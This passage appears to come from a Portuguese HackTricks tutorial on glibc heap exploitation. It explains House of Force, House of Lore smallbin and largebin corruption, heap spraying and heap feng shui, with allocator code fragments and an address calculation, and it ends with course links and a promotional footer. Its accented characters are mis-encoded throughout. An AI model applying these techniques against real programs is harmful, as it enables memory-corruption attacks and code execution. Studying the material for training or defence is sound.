Por exemplo, se o programa perguntar ao usu√°rio por um n√∫mero, poder√≠amos inserir 48 e apontar o ponteiro de malloc modific√°vel para os pr√≥ximos 4 bytes (que poderiam pertencer ao EBP com sorte, assim o 48 ficaria atr√°s, como se fosse o cabe√ßalho size). Al√©m disso, o endere√ßo ptr-4+48 deve atender a v√°rias condi√ß√µes (sendo neste caso ptr=EBP), ou seja, 8 < ptr-4+48 < av->system\_mem.

Caso isso seja cumprido, quando a pr√≥xima chamada para malloc que dissemos que era malloc(40) for feita, o endere√ßo atribu√≠do ser√° o endere√ßo do EBP. Caso o atacante tamb√©m possa controlar o que √© escrito nesse malloc, ele pode sobrescrever tanto o EBP quanto o EIP com o endere√ßo desejado.

Acredito que isso ocorre porque quando o free() √© chamado, ele armazenar√° que no endere√ßo apontado pelo EBP da pilha h√° um chunk de tamanho perfeito para o novo malloc() que est√° sendo reservado, ent√£o ele atribui esse endere√ßo.

**The House of Force**

√â necess√°rio:

* Um overflow para um chunk que permita sobrescrever o wilderness
* Uma chamada para malloc() com o tamanho definido pelo usu√°rio
* Uma chamada para malloc() cujos dados possam ser definidos pelo usu√°rio

O primeiro passo √© sobrescrever o tamanho do chunk wilderness com um valor muito grande (0xffffffff), para que qualquer solicita√ß√£o de mem√≥ria grande seja tratada em \_int\_malloc() sem a necessidade de expandir o heap.

O segundo passo √© alterar o av->top para apontar para uma √°rea de mem√≥ria sob o controle do atacante, como a pilha. Em av->top, ser√° colocado \&EIP - 8.

√â necess√°rio sobrescrever av->top para apontar para a √°rea de mem√≥ria sob o controle do atacante:

v√≠tima = av->top;

restante = chunck\_at\_offset(v√≠tima, nb);

av->top = restante;

A v√≠tima obt√©m o valor da dire√ß√£o do chunk wilderness atual (o av->top atual) e o restante √© exatamente a soma dessa dire√ß√£o mais a quantidade de bytes solicitados por malloc(). Portanto, se \&EIP-8 estiver em 0xbffff224 e av->top contiver 0x080c2788, ent√£o a quantidade que precisamos reservar no malloc controlado para que av->top aponte para $EIP-8 para o pr√≥ximo malloc() ser√°:

0xbffff224 - 0x080c2788 = 3086207644.

Assim, o valor alterado ser√° armazenado em av->top e o pr√≥ximo malloc apontar√° para o EIP e poder√° ser sobrescrito.

√â importante que o tamanho do novo chunk wilderness seja maior que a solicita√ß√£o feita pelo √∫ltimo malloc(). Ou seja, se o wilderness estiver apontando para \&EIP-8, o tamanho ficar√° exatamente no campo EBP da pilha.

**The House of Lore**

**Corrup√ß√£o SmallBin**

Os chunks liberados s√£o inseridos no bin de acordo com seu tamanho. Mas antes de serem inseridos, s√£o armazenados em unsorted bins. Quando um chunk √© liberado, ele n√£o √© imediatamente colocado em seu bin, mas permanece em unsorted bins. Em seguida, se um novo chunk for reservado e o anterior liberado puder ser √∫til, ele ser√° retornado, mas se for reservado um chunk maior, o chunk liberado em unsorted bins ser√° colocado em seu bin apropriado.

Para alcan√ßar o c√≥digo vulner√°vel, a solicita√ß√£o de mem√≥ria deve ser maior que av->max\_fast (normalmente 72) e menor que MIN\_LARGE\_SIZE (512).

Se houver um chunk no bin do tamanho adequado ao que est√° sendo solicitado, ele ser√° retornado ap√≥s ser desvinculado:

bck = v√≠tima->bk; Aponta para o chunk anterior, √© a √∫nica informa√ß√£o que podemos alterar.

bin->bk = bck; O pen√∫ltimo chunk se torna o √∫ltimo, caso bck aponte para a pilha, o pr√≥ximo chunk reservado receber√° esse endere√ßo.

bck->fd = bin; A lista √© fechada fazendo com que ele aponte para bin

S√£o necess√°rios:
Reserve dois malloc, de modo que o primeiro possa sofrer overflow ap√≥s o segundo ter sido liberado e inserido em seu bin (ou seja, um malloc maior que o segundo deve ser reservado antes do overflow).

O malloc reservado com o endere√ßo escolhido pelo atacante deve ser controlado pelo atacante.

O objetivo √© o seguinte: se pudermos fazer um overflow em um heap que tenha um peda√ßo liberado e em seu bin abaixo, podemos alterar seu ponteiro bk. Ao alterar o ponteiro bk e se esse peda√ßo se tornar o primeiro da lista do bin e for reservado, o bin ser√° enganado e informado de que o pr√≥ximo peda√ßo da lista est√° na falsa dire√ß√£o que escolhemos (como stack ou GOT, por exemplo). Portanto, se outro peda√ßo for reservado e o atacante tiver permiss√µes nele, um peda√ßo na posi√ß√£o desejada ser√° fornecido e poder√° ser escrito.

Ap√≥s liberar o peda√ßo modificado, √© necess√°rio reservar um peda√ßo maior do que o liberado, para que o peda√ßo modificado saia dos unsorted bins e seja inserido em seu bin.

Uma vez no bin, √© hora de modificar o ponteiro bk atrav√©s do overflow para que aponte para o endere√ßo que desejamos sobrescrever.

Assim, o bin deve esperar at√© que malloc() seja chamado v√°rias vezes para que o bin modificado seja usado novamente e engane o bin, fazendo-o acreditar que o pr√≥ximo peda√ßo est√° na dire√ß√£o falsa. Em seguida, o peda√ßo desejado ser√° fornecido.

Para que a vulnerabilidade seja explorada o mais r√°pido poss√≠vel, o ideal seria: reservar o peda√ßo vulner√°vel, reservar o peda√ßo a ser modificado, liberar esse peda√ßo, reservar um peda√ßo maior do que o a ser modificado, modificar o peda√ßo (vulnerabilidade), reservar um peda√ßo do mesmo tamanho do vulnerado e reservar um segundo peda√ßo do mesmo tamanho, que apontar√° para o endere√ßo escolhido.

Para proteger esse ataque, √© usada a verifica√ß√£o t√≠pica de que o peda√ßo "n√£o" √© falso: verifica-se se bck->fd est√° apontando para a v√≠tima. Ou seja, no nosso caso, se o ponteiro fd* do peda√ßo falso apontado na pilha est√° apontando para a v√≠tima. Para contornar essa prote√ß√£o, o atacante deve ser capaz de escrever de alguma forma (provavelmente na pilha) no endere√ßo correto da v√≠tima. Para que pare√ßa um peda√ßo verdadeiro.

**Corrup√ß√£o LargeBin**

S√£o necess√°rios os mesmos requisitos que antes e alguns adicionais, al√©m disso, os peda√ßos reservados devem ser maiores que 512.

O ataque √© semelhante ao anterior, ou seja, √© necess√°rio modificar o ponteiro bk e todas essas chamadas para malloc(), mas tamb√©m √© necess√°rio modificar o tamanho do peda√ßo modificado de forma que esse tamanho - nb seja < MINSIZE.

Por exemplo, √© necess√°rio definir o tamanho como 1552 para que 1552 - 1544 = 8 < MINSIZE (a subtra√ß√£o n√£o pode ser negativa porque √© comparada com um valor n√£o assinado).

Al√©m disso, foi introduzido um patch para torn√°-lo ainda mais complicado.

**Heap Spraying**

Basicamente consiste em reservar toda a mem√≥ria poss√≠vel para heaps e preench√™-los com um colch√£o de nops seguido de uma shellcode. Al√©m disso, o colch√£o √© preenchido com 0x0c. Assim, tenta-se saltar para o endere√ßo 0x0c0c0c0c e, se alguma dire√ß√£o for sobrescrita com esse colch√£o, o controle ser√° transferido para l√°. Basicamente, a t√°tica √© reservar o m√°ximo poss√≠vel para ver se algum ponteiro √© sobrescrito e saltar para 0x0c0c0c0c, esperando que haja nops l√°.

**Heap Feng Shui**

Consiste em semear a mem√≥ria por meio de reservas e libera√ß√µes para que peda√ßos reservados fiquem entre peda√ßos livres. O buffer a ser estourado ser√° colocado em um desses peda√ßos.

## Cursos Interessantes

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Refer√™ncias**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Aprenda hacking AWS do zero ao hero com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
